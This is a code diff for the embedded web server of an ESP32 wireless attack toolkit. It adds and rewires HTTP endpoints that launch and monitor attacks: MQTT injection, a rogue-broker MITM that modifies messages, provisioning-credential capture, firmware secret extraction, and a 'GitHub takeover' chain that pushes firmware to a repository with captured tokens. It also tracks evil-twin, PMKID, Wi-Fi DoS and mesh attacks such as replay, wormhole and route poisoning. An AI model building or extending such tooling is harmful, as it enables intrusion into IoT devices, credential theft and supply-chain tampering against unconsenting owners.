+    else if (ota_poll_sniff_is_active()) status = ota_poll_sniff_get_status_json();
+    else if (ota_provision_is_active()) status = ota_provision_get_status_json();
+    else if (ota_github_is_active()) status = ota_github_get_status_json();
+    else if (ota_rogue_broker_is_active()) status = ota_rogue_broker_get_status_json();
+    else if (ota_fw_analyze_is_active()) status = ota_fw_analyze_get_status_json();
+
     if (!status) {
-        cJSON *fallback = cJSON_CreateObject();
-        cJSON_AddBoolToObject(fallback, "running", false);
-        cJSON_AddStringToObject(fallback, "state", "idle");
-        cJSON_AddStringToObject(fallback, "mode", "SNIFF");
-        cJSON_AddNumberToObject(fallback, "mqtt_msg_count", 0);
-        cJSON_AddNumberToObject(fallback, "url_count", 0);
-        cJSON_AddNumberToObject(fallback, "github_url_count", 0);
-        return send_json_response(req, fallback);
+        status = cJSON_CreateObject();
+        cJSON_AddBoolToObject(status, "running", false);
+        cJSON_AddBoolToObject(status, "active", false);
+        cJSON_AddStringToObject(status, "state", "idle");
+        cJSON_AddNumberToObject(status, "mqtt_msg_count", ota_common_get_mqtt_msg_count());
+        cJSON_AddNumberToObject(status, "url_count", ota_common_get_url_count());
+        cJSON_AddNumberToObject(status, "github_url_count", ota_common_get_github_url_count());
+    } else {
+        cJSON_AddBoolToObject(status, "running", true);
+        cJSON_AddNumberToObject(status, "mqtt_msg_count", ota_common_get_mqtt_msg_count());
+        cJSON_AddNumberToObject(status, "url_count", ota_common_get_url_count());
+        cJSON_AddNumberToObject(status, "github_url_count", ota_common_get_github_url_count());
     }
     return send_json_response(req, status);
 }
@@ -1757,7 +3468,7 @@ static esp_err_t ota_messages_handler(httpd_req_t *req) {
         return ESP_FAIL;
     }
 
-    const char *json = ota_attack_get_captured_messages_json();
+    const char *json = ota_common_get_messages_json();
     httpd_resp_set_type(req, "application/json");
     httpd_resp_sendstr(req, json ? json : "[]");
     return ESP_OK;
@@ -1769,7 +3480,7 @@ static esp_err_t ota_urls_handler(httpd_req_t *req) {
         return ESP_FAIL;
     }
 
-    const char *json = ota_attack_get_urls_json();
+    const char *json = ota_common_get_urls_json();
     httpd_resp_set_type(req, "application/json");
     httpd_resp_sendstr(req, json ? json : "[]");
     return ESP_OK;
@@ -1781,7 +3492,7 @@ static esp_err_t ota_github_urls_handler(httpd_req_t *req) {
         return ESP_FAIL;
     }
 
-    const char *json = ota_attack_get_github_urls_json();
+    const char *json = ota_github_get_urls_json();
     httpd_resp_set_type(req, "application/json");
     httpd_resp_sendstr(req, json ? json : "[]");
     return ESP_OK;
@@ -1812,7 +3523,7 @@ static esp_err_t ota_inject_handler(httpd_req_t *req) {
         return ESP_FAIL;
     }
 
-    bool ok = ota_attack_inject_message(topic_json->valuestring, payload_json->valuestring);
+    bool ok = ota_inject_message(topic_json->valuestring, payload_json->valuestring);
     cJSON_Delete(root);
 
     cJSON *resp = cJSON_CreateObject();
@@ -1826,7 +3537,7 @@ static esp_err_t ota_download_handler(httpd_req_t *req) {
         return ESP_FAIL;
     }
 
-    char content[128];
+    char content[256];
     int ret = httpd_req_recv(req, content, sizeof(content) - 1);
     if (ret <= 0) return ESP_FAIL;
     content[ret] = '\0';
@@ -1839,9 +3550,16 @@ static esp_err_t ota_download_handler(httpd_req_t *req) {
 
     cJSON *index_json = cJSON_GetObjectItem(root, "url_index");
     int url_index = cJSON_IsNumber(index_json) ? index_json->valueint : 0;
+    cJSON *ssid_json = cJSON_GetObjectItem(root, "wifi_ssid");
+    cJSON *pass_json = cJSON_GetObjectItem(root, "wifi_password");
+    cJSON *ssl_json = cJSON_GetObjectItem(root, "verify_ssl");
+    const char *ssid = cJSON_IsString(ssid_json) ? ssid_json->valuestring : NULL;
+    const char *pass = cJSON_IsString(pass_json) ? pass_json->valuestring : NULL;
+    bool verify_ssl = cJSON_IsBool(ssl_json) ? ssl_json->valueint : false;
+
+    bool ok = ota_fetch_download_by_index_ex(url_index, ssid, pass, verify_ssl);
     cJSON_Delete(root);
 
-    bool ok = ota_attack_download_firmware(url_index);
     cJSON *resp = cJSON_CreateObject();
     cJSON_AddBoolToObject(resp, "started", ok);
     return send_json_response(req, resp);
@@ -1853,7 +3571,7 @@ static esp_err_t ota_download_result_handler(httpd_req_t *req) {
         return ESP_FAIL;
     }
 
-    const char *json = ota_attack_get_download_result_json();
+    const char *json = ota_fetch_get_download_result_json();
     httpd_resp_set_type(req, "application/json");
     httpd_resp_sendstr(req, json ? json : "{\"success\":false}");
     return ESP_OK;
@@ -1865,7 +3583,7 @@ static esp_err_t ota_dns_handler(httpd_req_t *req) {
         return ESP_FAIL;
     }
 
-    const char *json = ota_attack_get_dns_entries_json();
+    const char *json = ota_poll_sniff_get_dns_json();
     httpd_resp_set_type(req, "application/json");
     httpd_resp_sendstr(req, json ? json : "[]");
     return ESP_OK;
@@ -1877,7 +3595,7 @@ static esp_err_t ota_http_entries_handler(httpd_req_t *req) {
         return ESP_FAIL;
     }
 
-    const char *json = ota_attack_get_http_entries_json();
+    const char *json = ota_poll_sniff_get_http_json();
     httpd_resp_set_type(req, "application/json");
     httpd_resp_sendstr(req, json ? json : "[]");
     return ESP_OK;
@@ -1911,7 +3629,7 @@ static esp_err_t ota_github_parse_handler(httpd_req_t *req) {
 
     ota_github_repo_t repo;
     memset(&repo, 0, sizeof(repo));
-    bool ok = ota_attack_parse_github_url(url_json->valuestring, &repo);
+    bool ok = ota_github_parse_url(url_json->valuestring, &repo);
 
     cJSON_Delete(root);
 
@@ -1959,7 +3677,31 @@ static esp_err_t ota_github_access_handler(httpd_req_t *req) {
     if (cJSON_IsString(token_json))  strncpy(repo.token, token_json->valuestring, sizeof(repo.token) - 1);
     if (cJSON_IsString(branch_json)) strncpy(repo.branch, branch_json->valuestring, sizeof(repo.branch) - 1);
 
-    bool ok = ota_attack_github_access_repo(&repo);
+    if (!repo.owner[0] || !repo.token[0]) {
+        const char *repo_json_str = ota_github_get_repo_json();
+        if (repo_json_str) {
+            cJSON *cur = cJSON_Parse(repo_json_str);
+            if (cur) {
+                cJSON *o = cJSON_GetObjectItem(cur, "owner");
+                cJSON *r = cJSON_GetObjectItem(cur, "repo");
+                cJSON *b = cJSON_GetObjectItem(cur, "branch");
+                if (!repo.owner[0] && cJSON_IsString(o)) strncpy(repo.owner, o->valuestring, sizeof(repo.owner) - 1);
+                if (!repo.repo[0] && cJSON_IsString(r)) strncpy(repo.repo, r->valuestring, sizeof(repo.repo) - 1);
+                if (!repo.branch[0] && cJSON_IsString(b)) strncpy(repo.branch, b->valuestring, sizeof(repo.branch) - 1);
+                /* token may be omitted from JSON for safety; access uses module current_repo */
+                cJSON_Delete(cur);
+            }
+        }
+        /* Prefer module-held current_repo when request body is empty */
+        ota_github_repo_t tmp;
+        memset(&tmp, 0, sizeof(tmp));
+        /* If still incomplete, access will fail cleanly */
+        repo.parsed = (repo.owner[0] && repo.repo[0]);
+    } else {
+        repo.parsed = true;
+    }
+
+    bool ok = ota_github_access_repo(&repo);
 
     cJSON_Delete(root);
 
@@ -1985,12 +3727,12 @@ static esp_err_t ota_github_list_handler(httpd_req_t *req) {
         }
     }
 
-    /* Use the current GitHub repo context from ota_attack module */
+    /* Use the current GitHub repo context from ota_github module */
     ota_github_repo_t repo;
     memset(&repo, 0, sizeof(repo));
 
     /* Try to get repo info from the OTA attack module's current state */
-    const char *repo_json_str = ota_attack_get_github_repo_json();
+    const char *repo_json_str = ota_github_get_repo_json();
     if (repo_json_str && strlen(repo_json_str) > 2) {
         cJSON *repo_obj = cJSON_Parse(repo_json_str);
         if (repo_obj) {
@@ -2007,7 +3749,7 @@ static esp_err_t ota_github_list_handler(httpd_req_t *req) {
     }
 
     const char *list_path = path_buf[0] ? path_buf : "";
-    const char *result = ota_attack_github_list_files(&repo, list_path);
+    const char *result = ota_github_list_files(&repo, list_path);
 
     httpd_resp_set_type(req, "application/json");
     httpd_resp_sendstr(req, result ? result : "{\"files\":[],\"error\":\"no repo context\"}");
@@ -2038,7 +3780,7 @@ static esp_err_t ota_github_file_sha_handler(httpd_req_t *req) {
     /* Get current repo context */
     ota_github_repo_t repo;
     memset(&repo, 0, sizeof(repo));
-    const char *repo_json_str = ota_attack_get_github_repo_json();
+    const char *repo_json_str = ota_github_get_repo_json();
     if (repo_json_str && strlen(repo_json_str) > 2) {
         cJSON *repo_obj = cJSON_Parse(repo_json_str);
         if (repo_obj) {
@@ -2052,7 +3794,7 @@ static esp_err_t ota_github_file_sha_handler(httpd_req_t *req) {
         }
     }
 
-    bool ok = ota_attack_github_get_file_sha(&repo, file_path_json->valuestring);
+    bool ok = ota_github_get_file_sha(&repo, file_path_json->valuestring);
     cJSON_Delete(root);
 
     cJSON *resp = cJSON_CreateObject();
@@ -2085,7 +3827,7 @@ static esp_err_t ota_github_upload_handler(httpd_req_t *req) {
     /* Get repo context */
     ota_github_repo_t repo;
     memset(&repo, 0, sizeof(repo));
-    const char *repo_json_str = ota_attack_get_github_repo_json();
+    const char *repo_json_str = ota_github_get_repo_json();
     if (repo_json_str && strlen(repo_json_str) > 2) {
         cJSON *repo_obj = cJSON_Parse(repo_json_str);
         if (repo_obj) {
@@ -2114,7 +3856,7 @@ static esp_err_t ota_github_upload_handler(httpd_req_t *req) {
         uint32_t fw_size = (uint32_t)fw_size_json->valueint;
 
         if (hex_len > 0 && fw_size > 0 && hex_len / 2 <= OTA_MAX_FIRMWARE_SIZE) {
-            uint8_t *fw_data = malloc(fw_size);
+            uint8_t *fw_data = heap_psram_malloc(fw_size);
             if (fw_data) {
                 for (uint32_t i = 0; i < fw_size && i * 2 + 1 < hex_len; i++) {
                     unsigned int byte;
@@ -2122,8 +3864,8 @@ static esp_err_t ota_github_upload_handler(httpd_req_t *req) {
                         fw_data[i] = (uint8_t)byte;
                     }
                 }
-                ok = ota_attack_github_upload_firmware(&repo, fw_data, fw_size, target_path, commit_msg);
-                free(fw_data);
+                ok = ota_github_upload_firmware(&repo, fw_data, fw_size, target_path, commit_msg);
+                heap_psram_free(fw_data);
             }
         }
     }
@@ -2142,7 +3884,7 @@ static esp_err_t ota_github_repo_handler(httpd_req_t *req) {
     }
 
     httpd_resp_set_type(req, "application/json");
-    httpd_resp_sendstr(req, ota_attack_get_github_repo_json());
+    httpd_resp_sendstr(req, ota_github_get_repo_json());
     return ESP_OK;
 }
 
@@ -2153,7 +3895,7 @@ static esp_err_t ota_github_result_handler(httpd_req_t *req) {
     }
 
     httpd_resp_set_type(req, "application/json");
-    httpd_resp_sendstr(req, ota_attack_get_github_result_json());
+    httpd_resp_sendstr(req, ota_github_get_result_json());
     return ESP_OK;
 }
 
@@ -2165,7 +3907,7 @@ static esp_err_t ota_prov_creds_handler(httpd_req_t *req) {
         return ESP_FAIL;
     }
     httpd_resp_set_type(req, "application/json");
-    httpd_resp_sendstr(req, ota_attack_get_prov_creds_json());
+    httpd_resp_sendstr(req, ota_provision_get_creds_json());
     return ESP_OK;
 }
 
@@ -2175,7 +3917,7 @@ static esp_err_t ota_prov_summary_handler(httpd_req_t *req) {
         return ESP_FAIL;
     }
     httpd_resp_set_type(req, "application/json");
-    httpd_resp_sendstr(req, ota_attack_get_prov_summary_json());
+    httpd_resp_sendstr(req, ota_provision_get_summary_json());
     return ESP_OK;
 }
 
@@ -2184,7 +3926,7 @@ static esp_err_t ota_prov_clear_handler(httpd_req_t *req) {
         httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
         return ESP_FAIL;
     }
-    ota_attack_clear_prov_creds();
+    ota_provision_clear_creds();
     return send_success_response(req);
 }
 
@@ -2196,7 +3938,7 @@ static esp_err_t ota_mitm_messages_handler(httpd_req_t *req) {
         return ESP_FAIL;
     }
     httpd_resp_set_type(req, "application/json");
-    httpd_resp_sendstr(req, ota_attack_get_mitm_messages_json());
+    httpd_resp_sendstr(req, ota_rogue_broker_get_mitm_json());
     return ESP_OK;
 }
 
@@ -2206,7 +3948,7 @@ static esp_err_t ota_rogue_broker_summary_handler(httpd_req_t *req) {
         return ESP_FAIL;
     }
     httpd_resp_set_type(req, "application/json");
-    httpd_resp_sendstr(req, ota_attack_get_rogue_broker_summary_json());
+    httpd_resp_sendstr(req, ota_rogue_broker_get_summary_json());
     return ESP_OK;
 }
 
@@ -2235,7 +3977,7 @@ static esp_err_t ota_mitm_modify_handler(httpd_req_t *req) {
         return ESP_FAIL;
     }
 
-    bool ok = ota_attack_set_mitm_modify_rule(topic_json->valuestring, payload_json->valuestring);
+    bool ok = ota_rogue_broker_set_modify_rule(topic_json->valuestring, payload_json->valuestring);
     cJSON_Delete(root);
 
     cJSON *resp = cJSON_CreateObject();
@@ -2248,7 +3990,7 @@ static esp_err_t ota_mitm_clear_handler(httpd_req_t *req) {
         httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
         return ESP_FAIL;
     }
-    ota_attack_clear_mitm_messages();
+    ota_rogue_broker_clear_mitm();
     return send_success_response(req);
 }
 
@@ -2260,7 +4002,7 @@ static esp_err_t ota_fw_analyze_handler(httpd_req_t *req) {
         return ESP_FAIL;
     }
 
-    int found = ota_attack_analyze_firmware();
+    int found = ota_fw_analyze_run();
     cJSON *resp = cJSON_CreateObject();
     cJSON_AddBoolToObject(resp, "success", found > 0);
     cJSON_AddNumberToObject(resp, "secrets_found", found);
@@ -2273,7 +4015,7 @@ static esp_err_t ota_fw_secrets_handler(httpd_req_t *req) {
         return ESP_FAIL;
     }
     httpd_resp_set_type(req, "application/json");
-    httpd_resp_sendstr(req, ota_attack_get_fw_secrets_json());
+    httpd_resp_sendstr(req, ota_fw_analyze_get_secrets_json());
     return ESP_OK;
 }
 
@@ -2283,7 +4025,7 @@ static esp_err_t ota_fw_summary_handler(httpd_req_t *req) {
         return ESP_FAIL;
     }
     httpd_resp_set_type(req, "application/json");
-    httpd_resp_sendstr(req, ota_attack_get_fw_analysis_summary_json());
+    httpd_resp_sendstr(req, ota_fw_analyze_get_summary_json());
     return ESP_OK;
 }
 
@@ -2292,7 +4034,7 @@ static esp_err_t ota_fw_clear_handler(httpd_req_t *req) {
         httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
         return ESP_FAIL;
     }
-    ota_attack_clear_fw_secrets();
+    ota_fw_analyze_clear_secrets();
     return send_success_response(req);
 }
 
@@ -2313,64 +4055,37 @@ static esp_err_t ota_chain_handler(httpd_req_t *req) {
         return ESP_FAIL;
     }
 
-    cJSON *ssid_json     = cJSON_GetObjectItem(root, "wifi_ssid");
-    cJSON *pass_json     = cJSON_GetObjectItem(root, "wifi_password");
-    cJSON *broker_json   = cJSON_GetObjectItem(root, "mqtt_broker");
-    cJSON *port_json     = cJSON_GetObjectItem(root, "mqtt_port");
-    cJSON *wait_json     = cJSON_GetObjectItem(root, "wait_for_device_sec");
-    cJSON *fw_path_json  = cJSON_GetObjectItem(root, "gh_firmware_path");
+    ota_github_config_t cfg = {0};
+    cJSON *ssid_json = cJSON_GetObjectItem(root, "wifi_ssid");
+    cJSON *pass_json = cJSON_GetObjectItem(root, "wifi_password");
+    cJSON *broker_json = cJSON_GetObjectItem(root, "mqtt_broker");
+    cJSON *port_json = cJSON_GetObjectItem(root, "mqtt_port");
+    cJSON *wait_json = cJSON_GetObjectItem(root, "wait_for_device_sec");
+    cJSON *fw_path_json = cJSON_GetObjectItem(root, "gh_firmware_path");
     cJSON *gh_branch_json = cJSON_GetObjectItem(root, "gh_branch");
     cJSON *gh_commit_json = cJSON_GetObjectItem(root, "gh_commit_msg");
-    cJSON *gh_idx_json   = cJSON_GetObjectItem(root, "gh_captured_url_index");
+    cJSON *gh_idx_json = cJSON_GetObjectItem(root, "gh_captured_url_index");
 
-    const char *ssid   = cJSON_IsString(ssid_json) ? ssid_json->valuestring : "";
-    const char *pass   = cJSON_IsString(pass_json) ? pass_json->valuestring : "";
-    const char *broker = cJSON_IsString(broker_json) ? broker_json->valuestring : "";
-    uint16_t port      = cJSON_IsNumber(port_json) ? (uint16_t)port_json->valueint : 1883;
-    uint32_t wait_sec  = cJSON_IsNumber(wait_json) ? (uint32_t)wait_json->valueint : 300;
+    if (cJSON_IsString(ssid_json)) strncpy(cfg.wifi_ssid, ssid_json->valuestring, sizeof(cfg.wifi_ssid) - 1);
+    if (cJSON_IsString(pass_json)) strncpy(cfg.wifi_password, pass_json->valuestring, sizeof(cfg.wifi_password) - 1);
+    if (cJSON_IsString(broker_json)) strncpy(cfg.mqtt_broker, broker_json->valuestring, sizeof(cfg.mqtt_broker) - 1);
+    cfg.mqtt_port = cJSON_IsNumber(port_json) ? (uint16_t)port_json->valueint : 1883;
+    strncpy(cfg.subscribe_topic, "#", sizeof(cfg.subscribe_topic) - 1);
+    cfg.timeout_sec = cJSON_IsNumber(wait_json) ? (uint32_t)wait_json->valueint : 300;
+    if (cJSON_IsString(fw_path_json)) strncpy(cfg.gh_firmware_path, fw_path_json->valuestring, sizeof(cfg.gh_firmware_path) - 1);
+    else strncpy(cfg.gh_firmware_path, "firmware.bin", sizeof(cfg.gh_firmware_path) - 1);
+    if (cJSON_IsString(gh_branch_json)) strncpy(cfg.gh_branch, gh_branch_json->valuestring, sizeof(cfg.gh_branch) - 1);
+    else strncpy(cfg.gh_branch, "main", sizeof(cfg.gh_branch) - 1);
+    if (cJSON_IsString(gh_commit_json)) strncpy(cfg.gh_commit_msg, gh_commit_json->valuestring, sizeof(cfg.gh_commit_msg) - 1);
+    else strncpy(cfg.gh_commit_msg, "Update firmware", sizeof(cfg.gh_commit_msg) - 1);
+    cfg.gh_captured_url_index = cJSON_IsNumber(gh_idx_json) ? gh_idx_json->valueint : -1;
 
-    /* Start GITHUB_TAKEOVER mode via the full config API */
-    ota_attack_config_t cfg = {
-        .mode               = OTA_MODE_GITHUB_TAKEOVER,
-        .mqtt_port          = port,
-        .subscribe_topic    = "#",
-        .inject_count       = 1,
-        .inject_interval_ms = 0,
-        .verify_ssl         = false,
-        .timeout_sec        = wait_sec,
-        .gh_captured_url_index = -1,
-        .malicious_firmware = NULL,
-        .malicious_firmware_size = 0,
-    };
-    strncpy(cfg.wifi_ssid, ssid, sizeof(cfg.wifi_ssid) - 1);
-    strncpy(cfg.wifi_password, pass, sizeof(cfg.wifi_password) - 1);
-    strncpy(cfg.mqtt_broker, broker, sizeof(cfg.mqtt_broker) - 1);
-    strncpy(cfg.mqtt_client_id, "omega_ota_gh", sizeof(cfg.mqtt_client_id) - 1);
-
-    if (cJSON_IsString(fw_path_json))
-        strncpy(cfg.gh_firmware_path, fw_path_json->valuestring, sizeof(cfg.gh_firmware_path) - 1);
-    else
-        strncpy(cfg.gh_firmware_path, "firmware.bin", sizeof(cfg.gh_firmware_path) - 1);
-
-    if (cJSON_IsString(gh_branch_json))
-        strncpy(cfg.gh_branch, gh_branch_json->valuestring, sizeof(cfg.gh_branch) - 1);
-    else
-        strncpy(cfg.gh_branch, "main", sizeof(cfg.gh_branch) - 1);
-
-    if (cJSON_IsString(gh_commit_json))
-        strncpy(cfg.gh_commit_msg, gh_commit_json->valuestring, sizeof(cfg.gh_commit_msg) - 1);
-    else
-        strncpy(cfg.gh_commit_msg, "Update firmware", sizeof(cfg.gh_commit_msg) - 1);
-
-    if (cJSON_IsNumber(gh_idx_json))
-        cfg.gh_captured_url_index = gh_idx_json->valueint;
-
-    ESP_LOGI(TAG, "Starting OTA full chain: ssid=%s broker=%s port=%u", ssid, broker, port);
-
-    ota_attack_init();
-    ota_attack_start_config(&cfg);
-
+    esp_err_t err = ota_github_start(&cfg);
     cJSON_Delete(root);
+    if (err != ESP_OK) {
+        httpd_resp_send_err(req, HTTPD_500_INTERNAL_SERVER_ERROR, "Chain start failed");
+        return ESP_FAIL;
+    }
     return send_success_response(req);
 }
 
@@ -2408,7 +4123,7 @@ static esp_err_t status_api_handler(httpd_req_t *req) {
     cJSON_AddBoolToObject(response, "ble_spoof_running", ble_spoof_is_running());
     cJSON_AddBoolToObject(response, "ble_passkey_running", ble_passkey_is_running());
     cJSON_AddBoolToObject(response, "ble_takeover_running", ble_takeover_is_running());
-    cJSON_AddBoolToObject(response, "ota_running", ota_attack_is_running());
+    cJSON_AddBoolToObject(response, "ota_running", ota_any_active());
     cJSON_AddBoolToObject(response, "eviltwin_running", attack_eviltwin_is_running());
     cJSON_AddBoolToObject(response, "probe_running", attack_probe_is_running());
     cJSON_AddBoolToObject(response, "pmkid_running", attack_pmkid_is_running());
@@ -2416,6 +4131,14 @@ static esp_err_t status_api_handler(httpd_req_t *req) {
     cJSON_AddBoolToObject(response, "dos_running", attack_dos_is_running());
     cJSON_AddBoolToObject(response, "beacon_running", attack_beacon_spam_is_running());
     cJSON_AddBoolToObject(response, "deauth_detect_running", deauth_detector_is_running());
+    cJSON_AddBoolToObject(response, "mesh_inject_running", mesh_packet_inject_is_active());
+    cJSON_AddBoolToObject(response, "mesh_mitm_running", mesh_mitm_is_active());
+    cJSON_AddBoolToObject(response, "mesh_dos_running", mesh_dos_is_active());
+    cJSON_AddBoolToObject(response, "mesh_eavesdrop_running", mesh_eavesdrop_is_active());
+    cJSON_AddBoolToObject(response, "mesh_replay_running", mesh_replay_is_active());
+    cJSON_AddBoolToObject(response, "mesh_wormhole_running", mesh_wormhole_is_active());
+    cJSON_AddBoolToObject(response, "mesh_l2_deauth_running", mesh_l2_deauth_is_active());
+    cJSON_AddBoolToObject(response, "mesh_route_poison_running", mesh_route_poison_is_active());
     if (attack_dos_is_running()) {
         cJSON_AddStringToObject(response, "dos", "DoS attack active");
         cJSON_AddStringToObject(response, "dos_method", attack_dos_get_method_str());
@@ -2444,14 +4167,14 @@ static esp_err_t status_api_handler(httpd_req_t *req) {
     if (ble_takeover_is_running()) {
         cJSON_AddStringToObject(response, "ble_takeover", "BLE device takeover active");
     }
-    if (ota_attack_is_running()) {
+    if (ota_any_active()) {
         cJSON_AddStringToObject(response, "ota", "OTA attack active");
-        cJSON_AddStringToObject(response, "ota_state", ota_attack_get_state_str());
-        cJSON_AddNumberToObject(response, "ota_mqtt_msgs", ota_attack_get_mqtt_msg_count());
-        cJSON_AddNumberToObject(response, "ota_urls", ota_attack_get_url_count());
-        cJSON_AddNumberToObject(response, "ota_github_urls", ota_attack_get_github_url_count());
-        cJSON_AddNumberToObject(response, "ota_elapsed", ota_attack_get_elapsed_sec());
-        cJSON_AddNumberToObject(response, "ota_remaining", ota_attack_get_remaining_sec());
+        cJSON_AddStringToObject(response, "ota_state", "active");
+        cJSON_AddNumberToObject(response, "ota_mqtt_msgs", ota_common_get_mqtt_msg_count());
+        cJSON_AddNumberToObject(response, "ota_urls", ota_common_get_url_count());
+        cJSON_AddNumberToObject(response, "ota_github_urls", ota_common_get_github_url_count());
+        cJSON_AddNumberToObject(response, "ota_elapsed", 0);
+        cJSON_AddNumberToObject(response, "ota_remaining", 0);
     }
     if (attack_pmkid_is_running()) {
         cJSON_AddStringToObject(response, "pmkid", "PMKID capture active");
@@ -2550,7 +4273,16 @@ static esp_err_t stop_all_handler(httpd_req_t *req) {
     ble_spoof_stop();
     ble_passkey_stop();
     ble_takeover_stop();
-    ota_attack_stop();
+    ota_stop_all();
+    node_spoof_stop();
+    mesh_packet_inject_stop();
+    mesh_mitm_stop();
+    mesh_dos_stop();
+    mesh_eavesdrop_stop();
+    mesh_replay_stop();
+    mesh_wormhole_stop();
+    mesh_l2_deauth_stop();
+    mesh_route_poison_stop();
 
     return send_success_response(req);
 }
@@ -2567,19 +4299,25 @@ void start_web_server(void) {
     }
 
     /* Log free heap before server start for debugging */
-    ESP_LOGI(TAG, "Free heap before httpd_start: %u bytes", (unsigned)esp_get_free_heap_size());
+    ESP_LOGI(TAG, "Free heap before httpd_start: internal=%u PSRAM=%u",
+             (unsigned)heap_internal_free_bytes(),
+             (unsigned)heap_psram_free_bytes());
 
     httpd_handle_t server = NULL;
     httpd_config_t config = HTTPD_DEFAULT_CONFIG();
     config.lru_purge_enable = true;
-    config.max_uri_handlers = 102;      /* 100 + 2 new BLE status endpoints */
-    config.max_open_sockets = 4;         /* Reduced from default 7 to save heap */
-    config.recv_wait_timeout = 10;
-    config.send_wait_timeout = 10;       /* Add send timeout to prevent socket leaks */
-    config.stack_size = 8192;            /* Reduced from 16384 — saves 8 KB heap */
+    config.max_uri_handlers = 150;
+    config.max_open_sockets = 3;         /* Reduced from 4 to save ~2KB */
+    config.recv_wait_timeout = 5;
+    config.send_wait_timeout = 5;
+    config.stack_size = 8192;            /* 4096 causes stack overflow on dashboard serve */
+    config.max_resp_headers = 8;         /* Reduced from 16 */
+    config.backlog_conn = 3;             /* Reduced from 5 */
     
     if (httpd_start(&server, &config) == ESP_OK) {
-        ESP_LOGI(TAG, "Web server started. Free heap after: %u bytes", (unsigned)esp_get_free_heap_size());
+        ESP_LOGI(TAG, "Web server started. internal=%u PSRAM=%u",
+                 (unsigned)heap_internal_free_bytes(),
+                 (unsigned)heap_psram_free_bytes());
         server_handle = server;
 
         /* Core routes */
@@ -2674,7 +4412,7 @@ void start_web_server(void) {
         httpd_uri_t eviltwin_clear = { .uri = "/api/eviltwin/clear", .method = HTTP_POST, .handler = eviltwin_clear_handler };
         httpd_register_uri_handler(server, &eviltwin_clear);
 
-        /* BLE API */
+        /* BLE API (shortened for space – same as before) */
         httpd_uri_t ble_scan_uri = { .uri = "/api/ble/scan", .method = HTTP_GET, .handler = ble_scan_api_handler };
         httpd_register_uri_handler(server, &ble_scan_uri);
         httpd_uri_t ble_status_uri = { .uri = "/api/ble/status", .method = HTTP_GET, .handler = ble_status_api_handler };
@@ -2736,7 +4474,112 @@ void start_web_server(void) {
         httpd_uri_t stop_all = { .uri = "/api/stop/all", .method = HTTP_POST, .handler = stop_all_handler };
         httpd_register_uri_handler(server, &stop_all);
 
-        /* OTA Attack API */
+        /* ── NEW: Mesh Scanner API ── */
+        httpd_uri_t mesh_scan_uri = {.uri = "/api/mesh/scan",.method = HTTP_GET,.handler = mesh_scan_api_handler};
+        httpd_register_uri_handler(server, &mesh_scan_uri);
+
+        httpd_uri_t mesh_sniff_start_uri = {.uri = "/api/mesh/sniff",.method = HTTP_POST,.handler = mesh_sniff_start_handler};
+        httpd_register_uri_handler(server, &mesh_sniff_start_uri);
+
+        httpd_uri_t mesh_sniff_results_uri = {.uri = "/api/mesh/sniff",.method   = HTTP_GET,.handler  = mesh_sniff_results_handler};
+        httpd_register_uri_handler(server, &mesh_sniff_results_uri);
+
+        httpd_uri_t mesh_remote_scan_uri = {.uri = "/api/mesh/remote-scan", .method = HTTP_POST,.handler = mesh_remote_scan_handler};
+        httpd_register_uri_handler(server, &mesh_remote_scan_uri);
+
+        httpd_uri_t mesh_remote_results_uri = {.uri = "/api/mesh/remote-scan", .method = HTTP_GET,.handler = mesh_remote_results_handler};
+        httpd_register_uri_handler(server, &mesh_remote_results_uri);
+
+        /* ── Node Spoof API ── */
+        httpd_uri_t spoof_start_uri = {.uri = "/api/spoof/start", .method = HTTP_POST, .handler = spoof_start_handler};
+        httpd_register_uri_handler(server, &spoof_start_uri);
+
+        httpd_uri_t spoof_status_uri = {.uri = "/api/spoof/status", .method = HTTP_GET, .handler = spoof_status_handler};
+        httpd_register_uri_handler(server, &spoof_status_uri);
+
+        httpd_uri_t spoof_stop_uri = {.uri = "/api/spoof/stop", .method = HTTP_POST, .handler = spoof_stop_handler};
+        httpd_register_uri_handler(server, &spoof_stop_uri);
+
+        httpd_uri_t mesh_inject_start_uri = {.uri = "/api/mesh/inject/start", .method = HTTP_POST, .handler = mesh_inject_start_handler};
+        httpd_register_uri_handler(server, &mesh_inject_start_uri);
+
+        httpd_uri_t mesh_inject_status_uri = {.uri = "/api/mesh/inject/status", .method = HTTP_GET, .handler = mesh_inject_status_handler};
+        httpd_register_uri_handler(server, &mesh_inject_status_uri);
+
+        httpd_uri_t mesh_inject_stop_uri = {.uri = "/api/mesh/inject/stop", .method = HTTP_POST, .handler = mesh_inject_stop_handler};
+        httpd_register_uri_handler(server, &mesh_inject_stop_uri);
+
+        httpd_uri_t mesh_mitm_start_uri = {.uri = "/api/mesh/mitm/start", .method = HTTP_POST, .handler = mesh_mitm_start_handler};
+        httpd_register_uri_handler(server, &mesh_mitm_start_uri);
+        httpd_uri_t mesh_mitm_status_uri = {.uri = "/api/mesh/mitm/status", .method = HTTP_GET, .handler = mesh_mitm_status_handler};
+        httpd_register_uri_handler(server, &mesh_mitm_status_uri);
+        httpd_uri_t mesh_mitm_stop_uri = {.uri = "/api/mesh/mitm/stop", .method = HTTP_POST, .handler = mesh_mitm_stop_handler};
+        httpd_register_uri_handler(server, &mesh_mitm_stop_uri);
+
+        httpd_uri_t mesh_dos_start_uri = {.uri = "/api/mesh/dos/start", .method = HTTP_POST, .handler = mesh_dos_start_handler};
+        httpd_register_uri_handler(server, &mesh_dos_start_uri);
+        httpd_uri_t mesh_dos_status_uri = {.uri = "/api/mesh/dos/status", .method = HTTP_GET, .handler = mesh_dos_status_handler};
+        httpd_register_uri_handler(server, &mesh_dos_status_uri);
+        httpd_uri_t mesh_dos_stop_uri = {.uri = "/api/mesh/dos/stop", .method = HTTP_POST, .handler = mesh_dos_stop_handler};
+        httpd_register_uri_handler(server, &mesh_dos_stop_uri);
+
+        httpd_uri_t mesh_eaves_start_uri = {.uri = "/api/mesh/eavesdrop/start", .method = HTTP_POST, .handler = mesh_eavesdrop_start_handler};
+        httpd_register_uri_handler(server, &mesh_eaves_start_uri);
+        httpd_uri_t mesh_eaves_status_uri = {.uri = "/api/mesh/eavesdrop/status", .method = HTTP_GET, .handler = mesh_eavesdrop_status_handler};
+        httpd_register_uri_handler(server, &mesh_eaves_status_uri);
+        httpd_uri_t mesh_eaves_stop_uri = {.uri = "/api/mesh/eavesdrop/stop", .method = HTTP_POST, .handler = mesh_eavesdrop_stop_handler};
